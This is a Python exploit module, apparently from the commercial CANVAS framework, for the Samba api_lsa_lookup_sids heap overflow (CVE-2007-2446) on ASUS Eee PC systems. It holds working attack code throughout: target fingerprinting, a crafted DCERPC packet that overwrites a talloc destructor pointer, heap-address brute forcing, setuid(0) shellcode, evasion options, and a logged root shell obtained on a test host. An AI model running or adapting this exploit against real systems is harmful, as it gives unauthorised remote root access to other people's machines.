#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from tcpexploit import *
from MOSDEFShellServer import MosdefShellServer
from linuxNode import linuxNode
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libsmb import SMBClient, SMBClientException

# GUI info
VERSION = "1.0"
NAME = "SAMBA api_lsa_lookup_sids"
DESCRIPTION = "SAMBA api_lsa_lookup_sids Heap Overflow"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="Samba"
DOCUMENTATION["Date public"] = "5/15/2007"
DOCUMENTATION["CVE Name"] = "CVE-2007-2446"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2446"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Platforms Tested"] = "ASUS EEE with SAMBA 3.24"
PROPERTY = {}
PROPERTY["TYPE"] = "Exploit"
PROPERTY["SITE"] =  "Remote"
PROPERTY["ARCH"] = [ ["Linux", "X86"] ]

NOTES="""
http://samba.org/ftp/unpacked/talloc/talloc.c

Fingerprint (smbclient --list):

IPC$            IPC       IPC Service (eeepc-user1 server (Asus Eee PC))
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.24]

PoC:

[C] (10.10.10.207/32) [+] destructor -> 0x8415000
[C] (10.10.10.207/32) [!] attacking ncacn_np:10.10.10.207[\lsarpc]
[C] (10.10.10.207/32) [*] Found trigger .. initializing Linux node ..
...
[C] Self.fd=5
[C] Set up Linux dynamic linking assembly component server
[C] Initialized Local Functions.
[C] Resetting signal handlers...
[C] Reset sigchild
[C] Getting UIDs
[C] Calling findInterfaces
[C] Reading 2 interfaces from remote side
[C] (10.10.10.207/32) ID: 0 Setinfo: > SAMBA api_lsa_lookup_sids attacking 10.10.10.207:0
(succeeded) <
Linux/MOSDEF# id
[C] Getting UIDs
UID=0 EUID=0 GID=0 EGID=0
Linux/MOSDEF#

"""

# info, brute start, brute stop, step size
TARGETS = {
    0 : ["Autoversioning N/A",  0, 0, 0],
    1 : ["ASUS Samba 3.24 (Xandros/Debian) X86", 0x08352000, 0x0843d000, 60 * 1024] 
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name = NAME
        self.port = 139
        self.host = ""
        self.version = 0
        self.myDCE = None
        self.connectionList = []
        return

    def createShellcode(self):
        setids = """
        xorl %eax,%eax
        xorl %ebx,%ebx
        movb $23,%al // setuid(0)
        int $0x80
        xorl %eax,%eax
        xorl %ebx,%ebx
        movb $23,%al // setuid(0) .. have to do it twice for some wacky reason
        int $0x80
        xorl %eax,%eax
        xorl %ebx,%ebx
        movb $46,%al
        int $0x80 // setgid(0)
        """
        self.shellcode = mosdef.assemble(setids, "X86") + self.createLinuxGOShellcode('')
        return self.shellcode

    def neededListenerTypes(self):
        return []
    
    def test(self):
        """ use share enum to find Asus Eee PC string """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))

        ret = self.exploitnodes("shareenum")
        if ret in [None, []]:
            self.log("[-] No shares found")
        else:
            for share in ret[0]:
                self.log("[+] Share comment: %s" % share.comment)
                if "ASUS EEE PC" in share.comment.upper().replace('\x00', ''):
                    self.log("[!] Found ASUS Eee PC .. trying to determine SAMBA version :>")
                    if ':' in self.host:
                        s = self.gettcpsock(AF_INET6=1)
                    else:
                        s = self.gettcpsock()

                    try:
                        smb = SMBClient(s)
                        smb.negotiate()
                        smb.session_setup()
                    except SMBClientException, ex:
                        self.log('[-] Could not SMB connect: %s' % ex)
                        return 0

                    self.log(u"[+] OS: %s LANMAN: %s" % (smb.nativeos, smb.nativelanman))

                    # we can be pedantic if we want .. by why is this not smb.server ???
                    if u"Samba 3.0.24" in smb.nativelanman:
                        self.log("[!] Found vulnerable SAMBA version :D")

                    self.version = 1
                    return 1
        return 0

    def connect(self):
        # connect DCE pipe
        connectionList =  self.buildConnectionList()
        res = None
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
        
        for binding in connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote server - service is not running or the host is firewalled')
            return 0
            
        self.log("[!] initiating attack")
        return 1

    def buildConnectionList(self):
        """
        Specify endpoints for the attack
        """
        self.UUID = u"12345778-1234-abcd-ef00-0123456789ab"
        self.uuidversion = u"0.0"
        self.connectionList = [u"ncacn_np:%s[\\lsarpc]"% (self.host)]
        return self.connectionList    

    def SpamHeap(self):
        pkt = ""

        pkt += "A" * (64 * 1024)
        pkt += self.shellcode

        self.myDCE.dcerpc_connection.s.set_timeout(10 * 60)
        self.myDCE.call(0x10, pkt, response=True)

    # dlmalloc makes life hard .. use talloc algos:
    # http://samba.org/ftp/unpacked/talloc/talloc.c
    # using talloc desctructor

    def LsaLookupSids(self, num_structs_alloc, num_structs, p_destructor):
        # HANDLE
        pkt = '\x01' * 20

        # zero entries
        pkt += struct.pack("<L", 0) # num_entries
        pkt += struct.pack("<L", 0) # ptr_sid_enum

        #LSA_TRANS_NAME_ENUM
        pkt += struct.pack("<L", num_structs_alloc) #num_entries         (num_structs_alloc * (sizeof(LSA_TRANS_NAME)=0x10)) bytes to alloc
        pkt += struct.pack("<L", 0x88888888L)       #ptr_trans_names
        pkt += struct.pack("<L", num_structs)       #num_entries2         number of structs to read from packet (overflow size control)
        
        #LSA_TRANS_NAME (talloc overflow muck here)
        lsatname = ""
        lsatname += struct.pack("<H", 0x4141) #sid_name_use, to survive t_delete 0x290000 
        lsatname += struct.pack("<H", 0x0000) #padding (gets nulled out)
        #UNIHDR
        lsatname += struct.pack("<H", 0x4242) #uni_str_len
        lsatname += struct.pack("<H", 0x4242) #uni_str_max_len
        lsatname += struct.pack("<L", 0x41414110) #buffer (KEEP LAST BIT UNSET)
        lsatname += struct.pack("<L", 0x43434300) #domain_idx 
        pkt += lsatname * num_structs_alloc # these are just filler

        # PADDING
        pkt += 'A' * 8 # pad

        # talloc chunk muckery
        pkt += 'AAAA' # next
        pkt += 'BBBB' # prev
        pkt += struct.pack('<L', 0) # parent
        pkt += struct.pack('<L', 0) # child
        pkt += struct.pack('<L', 0) # refs
        pkt += struct.pack('<L', p_destructor) # destructor
        pkt += 'CCCC' # name
        pkt += 'DDDD' # size
        pkt += "\x70\xec\x14\xe8" # talloc flag muck

        pkt += "\xcc" * 256 # jmp back

        pkt += "A" * (64 * 1024) # nopz
        pkt += self.shellcode
     
        self.myDCE.dcerpc_connection.s.set_timeout(10)
        self.LsarOpenPolicy() # needed !
        ret = self.myDCE.call(0x0f, pkt, response=True)

        if not ret:
            return 1, "No response received during smb dce call connection!"

        return 0, ""


    def LsarOpenPolicy(self):
        """ do the LsarOpenPolicy call """
        pkt = 'A' * 64 # doesnt really matter as long as we do the call
        ret = self.myDCE.call(0x06, pkt, response=True)
        if not ret:
            return 1, "No response received during smb dce call connection!"

        return 0, ""

    def talloc_destructor(self, p_destructor):
        self.log("[+] destructor -> 0x%X" % p_destructor)

        try:
            self.connect()

            #print "ATTACH!"; sys.stdin.read(1)

            self.LsaLookupSids(256, 272,  p_destructor)
            trigger = self.myDCE.dcerpc_connection.s.recv(1)

            if trigger.find('G') != -1:

                self.log("[*] Found trigger .. initializing Linux node ..")
                self.myDCE.dcerpc_connection.s.send('O')
                node = linuxNode()
                node.parentnode = self.socknode
                shellServer = MosdefShellServer('Linux', 'i386')
                shellServer(self.myDCE.dcerpc_connection.s, node)
                node.startup()
                self.setSucceeded()
                return node

        except Exception, msg:
            print "[!] Exception! (%s)"%msg
            import traceback
            traceback.print_exc(file=sys.stdout)

        return 0                       
    
    def run(self):
        """ main exploit run """

        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        self.version = int(self.argsDict.get("version",self.version))
        self.socknode = self.argsDict["passednodes"][0]

        self.setInfo("%s attacking %s:%d - (in progress)" % \
                    (self.name, self.host, self.port), showlog=True)

        if not self.version:
            self.log("[-] Trying to determine version automagically ..")
            if self.test():
                self.log("[+] Target seems to me an ASUS Eee PC ..")
                self.version = 1
            else:
                self.log("[-] Unable to determine target version ..")
                return 0

        info, start, stop, step = TARGETS[self.version]

        self.log("[!] Attacking: %s (start: 0x%X, stop: 0x%X, step: 0x%X)" % \
                (info, start, stop, step))

        # brute loop
        while start < stop:
            ret = self.talloc_destructor(start)
            start += step
            if ret not in [0, None]:
                break

        if ret in [0, None]:
            self.setInfo("%s attacking %s:%d (failed)" % \
                        (self.name, self.host, self.port), showlog=True)
        else:
            self.setInfo("%s attacking %s:%d (succeeded)" % \
                        (self.name, self.host, self.port), showlog=True)
        
        return ret

    def displayVersions(self):
        i = 0
        for listline in TARGETS.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
        sys.exit(0)
    
if __name__== '__main__':
    app = theexploit()
    app.options = ["This exploit recycles the socket :), no connectback needed"]
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()

